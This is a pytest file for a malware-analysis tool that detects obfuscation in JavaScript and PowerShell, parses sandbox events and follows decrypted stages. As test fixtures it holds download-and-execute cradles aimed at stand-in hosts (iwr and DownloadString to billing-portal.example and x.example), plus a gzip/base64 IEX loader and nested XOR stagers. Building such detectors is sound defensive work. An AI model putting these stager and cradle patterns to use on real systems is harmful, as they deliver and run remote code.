"""Obfuscation techniques: static detectors, sandbox instrumentation and events."""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

from docutracex.parsers import javascript as J
from docutracex.parsers import js_techniques as jt


def _sample() -> str:
    spec = importlib.util.spec_from_file_location(
        "ms", Path(__file__).parents[1] / "scripts" / "make_samples.py")
    ms = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ms)
    return ms.obf_techniques_js().decode("utf-8")


def _have_v8() -> bool:
    try:
        import STPyV8  # noqa: F401
        return True
    except Exception:  # noqa: BLE001
        return False


def test_static_techniques_on_sample() -> None:
    code = _sample()
    ids = {t["id"]: t for t in jt.static_techniques(code, J.metrics(code)["obfuscation_score"])}
    assert set(ids) == {"arithmetic_literals", "escape_block", "xor_decryptor", "iife_string",
                        "fromcharcode_arith", "payload_key_decryptor", "fake_header"}
    assert ids["escape_block"]["variable"] == "_0xa"
    assert ids["payload_key_decryptor"]["key"] == "Fact2024" and ids["payload_key_decryptor"]["decryptor"] == "dec"
    assert all(t["phase"] == "static" for t in ids.values())


def test_clean_code_has_no_techniques() -> None:
    code = "/* jQuery v3 */\nfunction add(a, b) { return a + b; }\nvar x = add(1, 2);\n"
    assert jt.static_techniques(code, 0) == []


def test_instrument_wraps_declared_xor_functions() -> None:
    code = "function d(a,k){var o='';for(var i=0;i<a.length;i++){o+=String.fromCharCode(a[i]^k.charCodeAt(i%k.length));}return o;}"
    out = jt.instrument(code)
    assert out.endswith(code) and "_dtx_log('xor','d'" in out


def test_from_sandbox_events() -> None:
    sb = {"log": [
        {"kind": "call", "name": "WScript.Sleep", "args": ["15000"]},
        {"kind": "timing", "name": "Date.getTime", "args": [""]},
        {"kind": "timing", "name": "Date.getTime", "args": [""]},
        {"kind": "fromcharcode", "name": "String.fromCharCode", "args": ["WScript"]},
        {"kind": "xor", "name": "dec", "args": ["powershell -nop -c iwr http://x.example/a"]},
    ]}
    ids = {t["id"]: t for t in jt.from_sandbox(sb)}
    assert {"antisandbox_timing", "fromcharcode_resolved", "xor_resolved", "dropped_payload"} <= set(ids)
    assert "15000" in ids["antisandbox_timing"]["evidence"]
    assert ids["dropped_payload"]["payload"].startswith("powershell")
    assert all(t["phase"] == "sandbox" for t in ids.values())


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_sample_end_to_end(tmp_path: Path) -> None:
    f = tmp_path / "s.js"
    f.write_text(_sample(), encoding="utf-8")
    res = J.analyze(f, tmp_path, {})
    sc = res["scripts"][0]
    phases = {t["id"]: t["phase"] for t in sc["techniques"]}
    assert phases["payload_key_decryptor"] == "static" and phases["dropped_payload"] == "sandbox"
    assert "billing-portal.example" in next(t for t in sc["techniques"] if t["id"] == "dropped_payload")["payload"]
    rules = {x["rule"] for x in res["findings"]}
    assert {"js_dropped_payload", "js_antisandbox_timing", "js_payload_key_decryptor"} <= rules


def _ms():
    spec = importlib.util.spec_from_file_location(
        "ms2", Path(__file__).parents[1] / "scripts" / "make_samples.py")
    ms = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ms)
    return ms


def test_ps_xor_deflate_stager_resolves_to_final_stage() -> None:
    from docutracex.parsers import ps_deobf
    r = ps_deobf.deobfuscate(_ms().xor_stager_ps1().decode())
    assert {"xor-base64", "xor-char-array", "decompress"} <= set(r["methods"])
    assert "DownloadString('http://billing-portal.example/inv/stage4.ps1')" in r["code"]
    assert "'http://billing-portal.example/inv/beacon'" in r["code"]


def test_ps_gzip_inline_and_numeric_key() -> None:
    import base64
    import zlib
    from docutracex.parsers import ps_deobf
    final = "Start-Process calc.exe"
    c = zlib.compressobj(9, zlib.DEFLATED, 31)
    b = base64.b64encode(c.compress(final.encode()) + c.flush()).decode()
    cmd = ("IEX (New-Object IO.StreamReader((New-Object IO.Compression.GZipStream([IO.MemoryStream]"
           f"[Convert]::FromBase64String('{b}'),[IO.Compression.CompressionMode]::Decompress)),"
           "[Text.Encoding]::ASCII)).ReadToEnd()")
    assert ps_deobf.deobfuscate(cmd)["code"].strip() == final
    x = base64.b64encode(bytes(ch ^ 0x41 for ch in final.encode())).decode()
    loop = f"$d = [Convert]::FromBase64String('{x}'); foreach ($i in 0..($d.Length-1)) {{ $d[$i] = $d[$i] -bxor 0x41 }}"
    assert final in ps_deobf.deobfuscate(loop)["code"]


def test_binary_base64_is_not_turned_into_garbage() -> None:
    import base64
    import random
    from docutracex.parsers import ps_deobf
    rnd = random.Random(1234)
    for _ in range(50):
        b = base64.b64encode(bytes(rnd.randrange(256) for _ in range(64))).decode()
        cmd = f"$x = [Convert]::FromBase64String('{b}')"
        assert ps_deobf.deobfuscate(cmd)["code"] == cmd


@pytest.fixture()
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    from fastapi.testclient import TestClient
    from docutracex.app import create_app
    from docutracex.config import settings
    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    return TestClient(create_app())


def _analyze(client, name: str, data: bytes) -> tuple[str, Path]:
    import time
    from docutracex.config import settings
    r = client.post("/api/cases", files={"file": (name, data)}).json()
    tid = r["task"]["id"]
    for _ in range(1200):
        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid), {})
        if t.get("state") in ("completed", "failed"):
            break
        time.sleep(0.05)
    return r["analysis_id"], settings.cases_dir / r["analysis_id"] / "results"


def _tree(results: Path) -> list[dict]:
    import json
    return json.loads((results / "nested.json").read_text())["tree"]


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_chain_js_vbs_powershell_as_nested(client) -> None:
    import json
    _, res = _analyze(client, "sample_chain_dropper.js", _ms().chain_dropper_js())
    tree = _tree(res)
    vbs = next(n for n in tree if n["filename"].endswith(".vbs"))
    assert vbs["decrypted_from"].startswith("JavaScript") and vbs["kind"] == "script"
    assert {"vbscript", "powershell"} <= set(vbs["code"])           # re-analysed by both
    assert {"vbs_shell", "ps_download"} <= {f["rule"] for f in vbs["findings"]}
    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
    assert "http://billing-portal.example/inv/stage4.ps1" in iocs  # the final stage


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_decrypted_stages_are_followed_recursively(client) -> None:
    def xor_js(payload: str, key: str = "k3y") -> str:
        arr = ",".join(str(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
        return (f'var k = "{key}";\nvar d = [{arr}];\n'
                "function dec(a, key) { var o = ''; for (var i = 0; i < a.length; i++) "
                "{ o += String.fromCharCode(a[i] ^ key.charCodeAt(i % key.length)); } return o; }\n"
                "var fso = new ActiveXObject('Scripting.FileSystemObject');\n"
                "fso.CreateTextFile('s.tmp', true).Write(dec(d, k));\n")
    ps = "IEX (New-Object Net.WebClient).DownloadString('http://billing-portal.example/deep.ps1')"
    stage2 = xor_js(ps, "two")                 # JS that decrypts PowerShell
    stage1 = xor_js(stage2, "one")             # JS that decrypts stage2
    _, res = _analyze(client, "deep.js", stage1.encode())
    js2 = next(n for n in _tree(res) if n["filename"].endswith(".js"))
    assert js2["decrypted_from"]
    ps1 = next(n for n in js2["children"] if n["filename"].endswith(".ps1"))
    assert ps1["decrypted_from"] and "ps_download" in {f["rule"] for f in ps1["findings"]}


def test_decrypted_payloads_and_sniffing(tmp_path: Path) -> None:
    import base64
    from docutracex import decrypted
    assert decrypted.sniff_ext("powershell -nop -enc AAAA") == ".ps1"
    assert decrypted.sniff_ext('Dim a\r\nSet a = CreateObject("WScript.Shell")') == ".vbs"
    assert decrypted.sniff_ext("var a = 1; new ActiveXObject('x');") == ".js"
    assert decrypted.sniff_ext("@echo off\r\nset x=1") == ".bat"
    pe = b"MZ" + b"\x90" * 300 + b"This program cannot be run in DOS mode (inert stub)"
    mods = {
        "javascript": {"scripts": [{"location": "a.js", "sandbox": {"log": [
            {"kind": "xor", "name": "dec", "args": ["powershell -nop -c iwr http://x.example/a"]}]}}]},
        "powershell": {"scripts": [{"location": "b.ps1",
                                    "code": f"$x = '{base64.b64encode(pe).decode()}'"}]},
    }
    got = decrypted.payloads_from(mods)
    assert {p["how"] for p in got} == {"js-xor-dec", "powershell-base64"}
    items = decrypted.write(got, tmp_path / "decrypted")
    names = sorted(i["filename"] for i in items)
    assert names[0].endswith(".ps1") and names[1].endswith(".exe")
    assert (tmp_path / "decrypted" / names[1]).read_bytes() == pe
